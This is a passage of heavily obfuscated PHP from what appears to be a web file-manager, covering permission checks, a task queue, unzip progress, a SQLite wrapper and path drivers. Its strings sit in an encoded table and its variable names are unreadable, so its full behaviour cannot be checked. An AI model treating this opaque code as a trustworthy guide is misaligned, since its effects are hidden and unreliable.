self::AUTH_EDIT, $òÚ¡øì[1769] => self::AUTH_REMOVE, $òÚ¡øì[1780] => self::AUTH_SHARE, $òÚ¡øì[360] => self::AUTH_COMMENT, $òÚ¡øì[1620] => self::AUTH_EVENT, $òÚ¡øì[1820] => self::AUTH_ROOT); if (!isset($ˆ÷ÖÂ¹ï[$¹¥ğ€Š°])) { return; } $œ—£ˆÃü = $ˆ÷ÖÂ¹ï[$¹¥ğ€Š°]; $ÅÀÒûß€ = intval($ÅÀÒûß€); if ($ÅÀÒûß€ <= 0) { return !1; } if (($ÅÀÒûß€ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÅÀÒûß€ & $œ—£ˆÃü); } public static function authDisable($÷çâ‡„µ, $øÍğ³İ¸) { if (intval($÷çâ‡„µ) <= 0) { return 0; } return intval($÷çâ‡„µ) & ~$øÍğ³İ¸; } public $optionType = "\x53\171\x73\164\x65\155\56\163\x6f\x75\162\143\x65\101\x75\x74\x68\114\x69\163\164"; public $field = array("\156\141\x6d\145", "\x61\x75\164\150", "\x6c\141\142\145\154", "\144\x69\163\x70\x6c\x61\x79", "\163\171\x73\x74\145\155", "\163\x6f\x72\x74"); public function initData() { $°í«Ç¥ü = $this->authDefault(); foreach ($°í«Ç¥ü as $÷Ñã’™µ) { $this->add($÷Ñã’™µ); } } public function findAuth($şÄ›öĞİ, $Ú­£Õİ¶) { $Ë˜É€åã =& $_SERVER[ë¦»ºéÌ]; $úú“”Ë = parent::listData(); foreach ($úú“”Ë as $ÃÎÇ‰Ø†) { $•òáÌìÍ = intval($ÃÎÇ‰Ø†[$Ë˜É€åã[416]]); if ($•òáÌìÍ <= 0 || $ÃÎÇ‰Ø†[$Ë˜É€åã[1821]] == 0) { continue; } if (($•òáÌìÍ & $şÄ›öĞİ) != $şÄ›öĞİ) { continue; } if (($•òáÌìÍ & $Ú­£Õİ¶) != 0) { continue; } return $ÃÎÇ‰Ø†[$Ë˜É€åã[403]]; } return !1; } public function findAuthReadOnly() { $ËßÔÃÆŞ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $±ë¿¤ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ËßÔÃÆŞ, $±ë¿¤); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($Íàµ¾ìÑ = false, $âÜÅÌ±– = "\x73\x6f\162\x74", $–­¶®‹‡ = false) { return parent::listData($Íàµ¾ìÑ, $âÜÅÌ±–, $–­¶®‹‡); } public function update($ĞÌ¹“êè, $Ï¤´Æ¾) { $Ú¬„È¨î =& $_SERVER[ë¦»ºéÌ]; $›º‹×ùú = parent::listData($ĞÌ¹“êè); $Ê§é¬° = $this->findByName($Ï¤´Æ¾[$Ú¬„È¨î[42]]); if (!$›º‹×ùú || $Ê§é¬° && $Ê§é¬°[$Ú¬„È¨î[403]] != $›º‹×ùú[$Ú¬„È¨î[403]]) { return !1; } $this->filterAuth($Ï¤´Æ¾[$Ú¬„È¨î[416]]); return parent::update($ĞÌ¹“êè, $Ï¤´Æ¾); } public function remove($Ê…¸¥ò‚) { $¬Ã×½× = parent::listData($Ê…¸¥ò‚); if (!$¬Ã×½× || $¬Ã×½×[$_SERVER[ë¦»ºéÌ][1254]]) { return !1; } return parent::remove($Ê…¸¥ò‚); } public function add($¡§™Ü§ø = array()) { $¹ª¯çĞ =& $_SERVER[ë¦»ºéÌ]; if ($this->findByName($¡§™Ü§ø[$¹ª¯çĞ[42]])) { return !1; } $°Ç‘ã‘’ = array($¹ª¯çĞ[42] => $¹ª¯çĞ[12], $¹ª¯çĞ[416] => 1, $¹ª¯çĞ[1822] => $¹ª¯çĞ[1810], $¹ª¯çĞ[1821] => 1, $¹ª¯çĞ[1254] => 0, $¹ª¯çĞ[1823] => 0); $¡§™Ü§ø = array_merge($°Ç‘ã‘’, $¡§™Ü§ø); $¡§™Ü§ø[$¹ª¯çĞ[1823]] = $this->getSort(); $this->filterAuth($¡§™Ü§ø[$¹ª¯çĞ[416]]); return parent::insert($¡§™Ü§ø); } private function getSort() { $Ìæï§Æ =& $_SERVER[ë¦»ºéÌ]; $îåĞÇØ = parent::listData(); $ ¸í¿íˆ = array_to_keyvalue($îåĞÇØ, $Ìæï§Æ[12], $Ìæï§Æ[1823]); return empty($ ¸í¿íˆ) ? 0 : max($ ¸í¿íˆ) + 1; } private function filterAuth(&$ğŠ×ÙÈ›) { if (!$ğŠ×ÙÈ›) { return; } $­¡ÃÑ­â = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Ëœíú³Î = array(); foreach ($­¡ÃÑ­â as $´ß·Û¤ò) { if ($ğŠ×ÙÈ› & $´ß·Û¤ò) { $Ëœíú³Î[] = $´ß·Û¤ò; } } if (in_array(self::AUTH_ROOT, $Ëœíú³Î)) { $ğŠ×ÙÈ› = array_sum($­¡ÃÑ­â); return; } $Œèû‹Çá = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Ëœíú³Î as $´ß·Û¤ò) { if (isset($Œèû‹Çá[$´ß·Û¤ò])) { $Ëœíú³Î = array_merge($Ëœíú³Î, $Œèû‹Çá[$´ß·Û¤ò]); } } $Ëœíú³Î[] = self::AUTH_SHOW; $ğŠ×ÙÈ› = array_sum(array_unique($Ëœíú³Î)); } public function sort($¯ıÎõ›Ì, $ØÌÅ¥ßÀ) { return parent::update($¯ıÎõ›Ì, $ØÌÅ¥ßÀ); } } goto F©ƒÖ–¤ğ; Aì«Ú¯ê¤: define($_SERVER[ë¦»ºéÌ][0], $_SERVER[ë¦»ºéÌ][1]); $_SERVER[¹øóÜÍ­] = explode($_SERVER[ë¦»ºéÌ][2], gzinflate(substr($_SERVER[ë¦»ºéÌ][3], 10, -8))); function binCheckEq($é¡ö±ÀÔ, $û¨Üúï°) { return $é¡ö±ÀÔ == $û¨Üúï°; } goto e—İ®ÉÜì; CğÄ¦„©ˆ¶: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($‹¢ß¨Ì) { parent::__construct($‹¢ß¨Ì); $this->signatureVersion($_SERVER[ë¦»ºéÌ][223]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } define($_SERVER[ë¦»ºéÌ][244], 1); define($_SERVER[ë¦»ºéÌ][245], 2); goto d”ÂïÇ óŠ; F˜†œ¹Íµ¤: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\x73\x6b\x51\165\145\x75\x65\x4c\x65\156\x67\x74\x68"; const QUEUE_DATA = "\x74\141\x73\153\x51\x75\x65\165\145\x44\141\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($òØïıåî, $»Ùşê“Ë = array(), $ûøÒÆŠé = '', $’‡Ì¬Øë = '') { $ƒı¢—Ì÷ =& $_SERVER[ë¦»ºéÌ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($’‡Ì¬Øë && array_find_by_field(self::$listData, $ƒı¢—Ì÷[105], $’‡Ì¬Øë)) { return !0; } self::$listData[] = array($ƒı¢—Ì÷[270] => $òØïıåî, $ƒı¢—Ì÷[1709] => $»Ùşê“Ë, $ƒı¢—Ì÷[453] => $ûøÒÆŠé, $ƒı¢—Ì÷[105] => $’‡Ì¬Øë); return !0; } public static function addSubmit() { $ÜêùİˆÏ =& $_SERVER[ë¦»ºéÌ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($ÜêùİˆÏ[1710] . json_encode_force(array_to_keyvalue(self::$listData, $ÜêùİˆÏ[12], $ÜêùİˆÏ[453])), $ÜêùİˆÏ[1711]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($Ïº¬ĞŞØ, $ÁÄœ¬º = array(), $²«î„”â = '', $ŸÁ•Üìç = '') { $íôŠºğø =& $_SERVER[ë¦»ºéÌ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ßÁÏ™µ‘ = self::getAll(); if ($ŸÁ•Üìç && array_find_by_field($ßÁÏ™µ‘, $íôŠºğø[105], $ŸÁ•Üìç)) { return !0; } $ßÁÏ™µ‘[] = array($íôŠºğø[270] => $Ïº¬ĞŞØ, $íôŠºğø[1709] => $ÁÄœ¬º, $íôŠºğø[453] => $²«î„”â, $íôŠºğø[105] => $ŸÁ•Üìç); write_log($íôŠºğø[1710] . $²«î„”â, $íôŠºğø[1711]); self::setAll($ßÁÏ™µ‘); return !0; } public static function run() { $¨Ö—Ìü– =& $_SERVER[ë¦»ºéÌ]; $î«ñèÓŒ = self::getAll(); $ä¤ÂòÛŸ = array_shift($î«ñèÓŒ); if (!$ä¤ÂòÛŸ) { return !1; } self::setAll($î«ñèÓŒ); $·ûí‚„¼ = timeFloat(); try { Hook::apply($ä¤ÂòÛŸ[$¨Ö—Ìü–[270]], $ä¤ÂòÛŸ[$¨Ö—Ìü–[1709]]); } catch (Exception $¸ §éˆ) { } $éÕäã£Ù = number_format(timeFloat() - $·ûí‚„¼, 3) . $¨Ö—Ìü–[1648]; write_log($¨Ö—Ìü–[1712] . $ä¤ÂòÛŸ[$¨Ö—Ìü–[453]] . $¨Ö—Ìü–[1713] . $éÕäã£Ù, $¨Ö—Ìü–[1711]); return !0; } public static function count() { $›®í¦³£ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$›®í¦³£) { return 0; } return intval($›®í¦³£); } public static function getAll() { $³¿ÛÁ¾Õ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$³¿ÛÁ¾Õ) { return array(); } return $³¿ÛÁ¾Õ; } public static function setAll($ÈÈÒ°ãÊ) { $ª„¾ë = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ÈÈÒ°ãÊ), $ª„¾ë); Cache::set(self::QUEUE_DATA, $ÈÈÒ°ãÊ, $ª„¾ë); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ŞÑƒ”„“, $™¼öûã‹ = 5.0) { if (!$ŞÑƒ”„“) { return; } $óá¢ßş­ = Cache::get($ŞÑƒ”„“); if (!$óá¢ßş­ || timeFloat() - floatVal($óá¢ßş­) >= $™¼öûã‹) { Cache::set($ŞÑƒ”„“, timeFloat(), $™¼öûã‹ * 10); return !0; } return !1; } public static function timeLimitCall($Ğ¿‹ØîĞ, $˜¾øÌ, $Ÿ™ö©°Î, $±º˜†»Ô = 5.0) { $–Õ“»ñ =& $_SERVER[ë¦»ºéÌ]; if (!$Ğ¿‹ØîĞ || !$˜¾øÌ) { return; } self::$asyncAdd = !0; $ÜñŸéÚæ = $–Õ“»ñ[1714]; $Îµï“ÅÔ = Cache::get($ÜñŸéÚæ, !0); $ç×ì–ôÑ = array($–Õ“»ñ[1715] => timeFloat(), $–Õ“»ñ[1716] => timeFloat(), $–Õ“»ñ[270] => $˜¾øÌ, $–Õ“»ñ[1709] => $Ÿ™ö©°Î, $–Õ“»ñ[208] => $±º˜†»Ô); if (is_array($Îµï“ÅÔ[$Ğ¿‹ØîĞ])) { $ç×ì–ôÑ[$–Õ“»ñ[1716]] = $Îµï“ÅÔ[$Ğ¿‹ØîĞ][$–Õ“»ñ[1716]]; } if (is_array($Îµï“ÅÔ[$Ğ¿‹ØîĞ])) { if (timeFloat() - $Îµï“ÅÔ[$Ğ¿‹ØîĞ][$–Õ“»ñ[1715]] < $ç×ì–ôÑ[$–Õ“»ñ[208]] * 0.3) { return; } $ç×ì–ôÑ[$–Õ“»ñ[1716]] = $Îµï“ÅÔ[$Ğ¿‹ØîĞ][$–Õ“»ñ[1716]]; } $Îµï“ÅÔ[$Ğ¿‹ØîĞ] = $ç×ì–ôÑ; Cache::set($ÜñŸéÚæ, $Îµï“ÅÔ, 60); Cache::removeMemory($ÜñŸéÚæ); write_log($–Õ“»ñ[1717] . $Ğ¿‹ØîĞ . $–Õ“»ñ[81] . $˜¾øÌ, $–Õ“»ñ[1711]); } public static function timeLimitCallLoop() { $Ş•¶Š¶¼ =& $_SERVER[ë¦»ºéÌ]; $Şşõ¼Ÿ¢ = array($Ş•¶Š¶¼[1718]); $ûæğ¤©Ş = in_array(strtolower(ACTION), $Şşõ¼Ÿ¢); if (!$ûæğ¤©Ş && !self::$asyncAdd) { return; } $¡Íçëƒï = $Ş•¶Š¶¼[1714]; $ı®—˜¯• = Cache::get($¡Íçëƒï, !0); if (!$ı®—˜¯• || count($ı®—˜¯•) <= 0) { return; } $¥ñî£‘œ = !1; $ÆĞæ¹œ = timeFloat(); $‹ÊÉ„Ç» = array(); foreach ($ı®—˜¯• as $úîã¤Úò => $×Á´†¦¢) { if ($ÆĞæ¹œ - $×Á´†¦¢[$Ş•¶Š¶¼[1716]] > $×Á´†¦¢[$Ş•¶Š¶¼[208]]) { $¥ñî£‘œ = !0; try { Hook::apply($×Á´†¦¢[$Ş•¶Š¶¼[270]], $×Á´†¦¢[$Ş•¶Š¶¼[1709]]); write_log($Ş•¶Š¶¼[1719] . $úîã¤Úò . $Ş•¶Š¶¼[81] . $×Á´†¦¢[$Ş•¶Š¶¼[270]] . $Ş•¶Š¶¼[1720] . ACTION, $Ş•¶Š¶¼[1711]); } catch (Exception $Œ™İáÈÇ) { } continue; } $‹ÊÉ„Ç»[$úîã¤Úò] = $×Á´†¦¢; } if (!$¥ñî£‘œ) { return; } if (!$‹ÊÉ„Ç») { return Cache::remove($¡Íçëƒï); } Cache::set($¡Íçëƒï, $‹ÊÉ„Ç», 60); Cache::removeMemory($¡Íçëƒï); } public static function finished($ĞÒ¬ÁñË, $Ó†©·‚) { $íù”’—Ç =& $_SERVER[ë¦»ºéÌ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($íù”’—Ç[270] => $ĞÒ¬ÁñË, $íù”’—Ç[1709] => $Ó†©·‚); } private static function finishedRun() { $îàÌ®Ü½ =& $_SERVER[ë¦»ºéÌ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $˜ İâ¯Œ) { try { Hook::apply($˜ İâ¯Œ[$îàÌ®Ü½[270]], $˜ İâ¯Œ[$îàÌ®Ü½[1709]]); } catch (Exception $¯ÈÇ”Œ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $¾Ä÷éŞ =& $_SERVER[ë¦»ºéÌ]; parent::startAfter(); Hook::bind($¾Ä÷éŞ[1721], array($this, $¾Ä÷éŞ[1722])); Hook::bind($¾Ä÷éŞ[1172], array($this, $¾Ä÷éŞ[1723])); $ñ™°‡ò =& $this->task; $ñ™°‡ò[$¾Ä÷éŞ[1724]] = $¾Ä÷éŞ[1177]; if (!$ñ™°‡ò[$¾Ä÷éŞ[1532]]) { $ñ™°‡ò[$¾Ä÷éŞ[1532]] = LNG($¾Ä÷éŞ[1725]); } } protected function endAfter() { $¹–ß£òº =& $_SERVER[ë¦»ºéÌ]; parent::endAfter(); Hook::unbind($¹–ß£òº[1721], array($this, $¹–ß£òº[1722])); Hook::unbind($¹–ß£òº[1172], array($this, $¹–ß£òº[1723])); } public function updateAfter() { $«µ°¾ßÓ =& $_SERVER[ë¦»ºéÌ]; $˜Á§£÷ =& $this->task; if (!$˜Á§£÷[$«µ°¾ßÓ[770]] || !$˜Á§£÷[$«µ°¾ßÓ[747]]) { return; } if ($˜Á§£÷[$«µ°¾ßÓ[1724]] == $«µ°¾ßÓ[1177]) { $ùëú¾éÁ = 0; if ($˜Á§£÷[$«µ°¾ßÓ[1680]]) { $ùëú¾éÁ = $˜Á§£÷[$«µ°¾ßÓ[1681]] / $˜Á§£÷[$«µ°¾ßÓ[1680]]; } $˜Á§£÷[$«µ°¾ßÓ[1634]] = $ùëú¾éÁ * 0.3; } else { if ($˜Á§£÷[$«µ°¾ßÓ[1724]] == $«µ°¾ßÓ[319]) { $ùëú¾éÁ = $˜Á§£÷[$«µ°¾ßÓ[1633]] / $˜Á§£÷[$«µ°¾ßÓ[770]]; $˜Á§£÷[$«µ°¾ßÓ[1634]] = 0.3 + $ùëú¾éÁ * 0.4; } else { if ($˜Á§£÷[$«µ°¾ßÓ[1724]] == $«µ°¾ßÓ[118]) { $İ×ËòÄ— = 0; if ($˜Á§£÷[$«µ°¾ßÓ[1682]] == $«µ°¾ßÓ[118]) { $İ×ËòÄ— = $˜Á§£÷[$«µ°¾ßÓ[1681]]; } $ùëú¾éÁ = ($˜Á§£÷[$«µ°¾ßÓ[1685]] + $İ×ËòÄ—) / $˜Á§£÷[$«µ°¾ßÓ[747]]; $˜Á§£÷[$«µ°¾ßÓ[1634]] = 0.3 + 0.4 + $ùëú¾éÁ * 0.3; } } } if ($˜Á§£÷[$«µ°¾ßÓ[1634]] > 0) { $°…´û—Ë = timeFloat() - $˜Á§£÷[$«µ°¾ßÓ[1636]] - $˜Á§£÷[$«µ°¾ßÓ[1639]]; $˜Á§£÷[$«µ°¾ßÓ[1640]] = $°…´û—Ë * (1 - $˜Á§£÷[$«µ°¾ßÓ[1634]]) / $˜Á§£÷[$«µ°¾ßÓ[1634]]; } } public function addFile($‰Š™µ·ş) { $÷•ÁÄÛ€ =& $_SERVER[ë¦»ºéÌ]; $‹Ê¨ÚÌó =& $this->task; $‰÷€®ˆ¸ = IO::info($‰Š™µ·ş); $‹Ê¨ÚÌó[$÷•ÁÄÛ€[1678]] = $‰÷€®ˆ¸[$÷•ÁÄÛ€[42]]; $‹Ê¨ÚÌó[$÷•ÁÄÛ€[1680]] = $‰÷€®ˆ¸[$÷•ÁÄÛ€[90]]; $‹Ê¨ÚÌó[$÷•ÁÄÛ€[1681]] = 0; $‹Ê¨ÚÌó[$÷•ÁÄÛ€[1044]] = $÷•ÁÄÛ€[1700]; $‹Ê¨ÚÌó[$÷•ÁÄÛ€[1682]] = $÷•ÁÄÛ€[1177]; $‹Ê¨ÚÌó[$÷•ÁÄÛ€[747]] = $‰÷€®ˆ¸[$÷•ÁÄÛ€[90]]; $‹Ê¨ÚÌó[$÷•ÁÄÛ€[770]] = 1; $½•êÊ˜Ü = 0; $‹Ê¨ÚÌó[$÷•ÁÄÛ€[1689]] = array($÷•ÁÄÛ€[1690] => $½•êÊ˜Ü + 1, $÷•ÁÄÛ€[423] => $‰÷€®ˆ¸[$÷•ÁÄÛ€[42]], $÷•ÁÄÛ€[88] => $‰÷€®ˆ¸[$÷•ÁÄÛ€[88]], $÷•ÁÄÛ€[521] => $‰÷€®ˆ¸[$÷•ÁÄÛ€[521]] ? $‰÷€®ˆ¸[$÷•ÁÄÛ€[521]] : $‰÷€®ˆ¸[$÷•ÁÄÛ€[88]]); $this->update(); } public function unzipAfter($šöˆ Ë) { $àÜ²îò =& $_SERVER[ë¦»ºéÌ]; $ª¤’ÙÀ¬ =& $this->task; $ª¤’ÙÀ¬[$àÜ²îò[1724]] = $àÜ²îò[118]; $ëÔÚ¯ªÚ = IO::infoWithChildren($šöˆ Ë); $¯—˜§ÅÒ = 0; $ª¤’ÙÀ¬[$àÜ²îò[1689]] = array($àÜ²îò[1690] => $¯—˜§ÅÒ + 1, $àÜ²îò[423] => $ëÔÚ¯ªÚ[$àÜ²îò[42]], $àÜ²îò[88] => $ëÔÚ¯ªÚ[$àÜ²îò[88]], $àÜ²îò[521] => $ëÔÚ¯ªÚ[$àÜ²îò[521]] ? $ëÔÚ¯ªÚ[$àÜ²îò[521]] : $ëÔÚ¯ªÚ[$àÜ²îò[88]]); if ($ëÔÚ¯ªÚ[$àÜ²îò[43]] == $àÜ²îò[204]) { $ª¤’ÙÀ¬[$àÜ²îò[770]] = 1; } else { $ª¤’ÙÀ¬[$àÜ²îò[770]] = $ëÔÚ¯ªÚ[$àÜ²îò[93]][$àÜ²îò[91]]; } $ª¤’ÙÀ¬[$àÜ²îò[1044]] = $àÜ²îò[12]; $ª¤’ÙÀ¬[$àÜ²îò[1682]] = 0; $ª¤’ÙÀ¬[$àÜ²îò[1633]] = 0; $ª¤’ÙÀ¬[$àÜ²îò[1680]] = 0; $ª¤’ÙÀ¬[$àÜ²îò[1681]] = 0; $ª¤’ÙÀ¬[$àÜ²îò[1678]] = $àÜ²îò[12]; $ª¤’ÙÀ¬[$àÜ²îò[1685]] = 0; $ª¤’ÙÀ¬[$àÜ²îò[747]] = $ëÔÚ¯ªÚ[$àÜ²îò[90]]; $this->update(); self::log($àÜ²îò[1726] . json_encode(array($ª¤’ÙÀ¬, $ëÔÚ¯ªÚ))); } public function nameParse($çË¡£ı¸) { $áÛçüä =& $_SERVER[ë¦»ºéÌ]; $îÂĞé‚€ =& $this->task; if ($îÂĞé‚€[$áÛçüä[1724]] == $áÛçüä[1177]) { $îÂĞé‚€[$áÛçüä[1724]] = $áÛçüä[319]; $îÂĞé‚€[$áÛçüä[1685]] = 0; $îÂĞé‚€[$áÛçüä[747]] = 0; } $½É¤¢ï¹ = get_path_this($çË¡£ı¸); if (strstr($½É¤¢ï¹, $áÛçüä[10])) { $îÂĞé‚€[$áÛçüä[1633]] += 1; $îÂĞé‚€[$áÛçüä[770]] += 1; } $îÂĞé‚€[$áÛçüä[1678]] = $çË¡£ı¸; $this->update(); } } goto B“Ş®Úµ; dÙøá‚éŸ: class DbSqlite3Base extends Db { public function __construct($ŒÙöøÀÏ = '') { $ÉİÀÎÍÕ =& $_SERVER[ë¦»ºéÌ]; if (!class_exists($ÉİÀÎÍÕ[64])) { think_exception(think_lang($ÉİÀÎÍÕ[24]) . $ÉİÀÎÍÕ[65]); } if (!empty($ŒÙöøÀÏ)) { if (!isset($ŒÙöøÀÏ[$ÉİÀÎÍÕ[26]])) { $ŒÙöøÀÏ[$ÉİÀÎÍÕ[26]] = 438; } $this->config = $ŒÙöøÀÏ; if (empty($this->config[$ÉİÀÎÍÕ[27]])) { $this->config[$ÉİÀÎÍÕ[27]] = array(); } } } public function connect($¹äóÛ = '', $ˆƒÌøó· = 0) { $ï¸ö¦Ú¶ =& $_SERVER[ë¦»ºéÌ]; if (!isset($this->linkID[$ˆƒÌøó·])) { if (empty($¹äóÛ)) { $¹äóÛ = $this->config; } $this->linkID[$ˆƒÌøó·] = new SQLite3($¹äóÛ[$ï¸ö¦Ú¶[31]]); if (!$this->linkID[$ˆƒÌøó·]) { think_exception($this->linkID[$ˆƒÌøó·]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ˆƒÌøó·]->busyTimeout(30000); if (1 != think_config($ï¸ö¦Ú¶[32])) { unset($this->config); } } return $this->linkID[$ˆƒÌøó·]; } public function free() { $this->queryID = null; } public function query($Õøâ–ß) { $ƒİ÷‡ü =& $_SERVER[ë¦»ºéÌ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Õøâ–ß; if ($this->queryID) { $this->free(); } think_action_status($ƒİ÷‡ü[33], 1); think_status($ƒİ÷‡ü[34]); $this->queryID = $this->_linkID->query($Õøâ–ß); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $æë®Ù÷ = $this->getAll(); $this->numRows = count($æë®Ù÷); return $æë®Ù÷; } } public function execute($‚Î€‡¦Î) { $ıĞÆäÏø =& $_SERVER[ë¦»ºéÌ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‚Î€‡¦Î; if ($this->queryID) { $this->free(); } think_action_status($ıĞÆäÏø[35], 1); think_status($ıĞÆäÏø[34]); $á êùÎÜ = $this->_linkID->exec($‚Î€‡¦Î); $this->debug(); if (!1 === $á êùÎÜ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ë¦»ºéÌ][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÙóÑ•Ö = $this->_linkID->query($_SERVER[ë¦»ºéÌ][37]); if (!$ÙóÑ•Ö) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÁÜ®öÒ = $this->_linkID->query($_SERVER[ë¦»ºéÌ][38]); if (!$ÁÜ®öÒ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ù‡Ëû¸Š = array(); while ($÷­İ»÷Á = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Ù‡Ëû¸Š[] = $÷­İ»÷Á; } $this->queryID->reset(); return $Ù‡Ëû¸Š; } public function getFields($¿ãØÀï®) { $çÀê±ÌŸ =& $_SERVER[ë¦»ºéÌ]; $ó«Ğõ¦° = $this->query($çÀê±ÌŸ[39] . $¿ãØÀï® . $çÀê±ÌŸ[40]); $ï¥íŒ–æ = array(); if ($ó«Ğõ¦°) { foreach ($ó«Ğõ¦° as $Ğ¬À£ëÄ => $á…„‘òÉ) { $ï¥íŒ–æ[$á…„‘òÉ[$çÀê±ÌŸ[42]]] = array($çÀê±ÌŸ[42] => $á…„‘òÉ[$çÀê±ÌŸ[42]], $çÀê±ÌŸ[43] => $á…„‘òÉ[$çÀê±ÌŸ[43]], $çÀê±ÌŸ[45] => (bool) ($á…„‘òÉ[$çÀê±ÌŸ[45]] === $çÀê±ÌŸ[12]), $çÀê±ÌŸ[47] => $á…„‘òÉ[$çÀê±ÌŸ[66]], $çÀê±ÌŸ[49] => (bool) $á…„‘òÉ[$çÀê±ÌŸ[67]], $çÀê±ÌŸ[52] => (bool) $á…„‘òÉ[$çÀê±ÌŸ[67]]); } } return $ï¥íŒ–æ; } public function getTables($Û°çí‘ù = '') { $Óı¨İöë =& $_SERVER[ë¦»ºéÌ]; $ğĞÊñå» = $this->query($Óı¨İöë[55] . $Óı¨İöë[56] . $Óı¨İöë[57]); $¹•Úó¬² = array(); foreach ($ğĞÊñå» as $şÏ¢†·Ú => $äñş³¿×) { $¹•Úó¬²[$şÏ¢†·Ú] = current($äñş³¿×); } return $¹•Úó¬²; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¸·”½Àä =& $_SERVER[ë¦»ºéÌ]; $this->error = $this->_linkID->lastErrorMsg(); if ($¸·”½Àä[12] != $this->queryStr) { $this->error .= LNG($¸·”½Àä[58]) . $this->queryStr; } think_trace($this->error, $¸·”½Àä[12], $¸·”½Àä[59]); return $this->error; } public function escapeString($œş…Ø¡”) { $ ½Ã×¬ë =& $_SERVER[ë¦»ºéÌ]; if ($this->_linkID) { return $this->_linkID->escapeString($œş…Ø¡”); } return str_ireplace($ ½Ã×¬ë[68], $ ½Ã×¬ë[69], $œş…Ø¡”); } public function parseLimit($–ÄşĞë) { $„ÛÁ«Øƒ =& $_SERVER[ë¦»ºéÌ]; $şÙæ¸Ç = $„ÛÁ«Øƒ[12]; if (!empty($–ÄşĞë)) { $–ÄşĞë = explode($„ÛÁ«Øƒ[60], $–ÄşĞë); if (count($–ÄşĞë) > 1) { $şÙæ¸Ç .= $„ÛÁ«Øƒ[61] . $–ÄşĞë[1] . $„ÛÁ«Øƒ[62] . $–ÄşĞë[0] . $„ÛÁ«Øƒ[63]; } else { $şÙæ¸Ç .= $„ÛÁ«Øƒ[61] . $–ÄşĞë[0] . $„ÛÁ«Øƒ[63]; } } return $şÙæ¸Ç; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $•¹‚•Œ =& $_SERVER[ë¦»ºéÌ]; $this->objectDriver = array($•¹‚•Œ[70], $•¹‚•Œ[71], $•¹‚•Œ[72], $•¹‚•Œ[73], $•¹‚•Œ[74], $•¹‚•Œ[75], $•¹‚•Œ[76], $•¹‚•Œ[77], $•¹‚•Œ[78]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¹îó—ƒ¦) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¹îó—ƒ¦, $_SERVER[ë¦»ºéÌ][8]); } return $¹îó—ƒ¦; } public function iconvApp($§ÊÂŸ±š) { return $§ÊÂŸ±š; } public function iconvSystem($ışß·Üú) { return $ışß·Üú; } public function iconvTo($«¢Ä×÷, $–”Ç°’î, $èåò¤›â) { $¿³ìÈáã =& $_SERVER[ë¦»ºéÌ]; if (!$«¢Ä×÷ || !function_exists($¿³ìÈáã[79])) { return $«¢Ä×÷; } static $‹ƒ„óÆ = array(); $¡Î€Ø”¯ = $–”Ç°’î . $¿³ìÈáã[80] . $èåò¤›â . $¿³ìÈáã[81] . $«¢Ä×÷; if (isset($‹ƒ„óÆ[$¡Î€Ø”¯])) { return $‹ƒ„óÆ[$¡Î€Ø”¯]; } if (function_exists($¿³ìÈáã[82])) { $¡å—ñ­á = @mb_convert_encoding($«¢Ä×÷, $èåò¤›â, $–”Ç°’î); } else { $¡å—ñ­á = @iconv($–”Ç°’î, $èåò¤›â, $«¢Ä×÷); } $¡å—ñ­á = $¡å—ñ­á ? $¡å—ñ­á : $«¢Ä×÷; if (strstr($¡å—ñ­á, $¿³ìÈáã[83])) { $¡å—ñ­á = str_replace($¿³ìÈáã[83], $¿³ìÈáã[11], $¡å—ñ­á); } 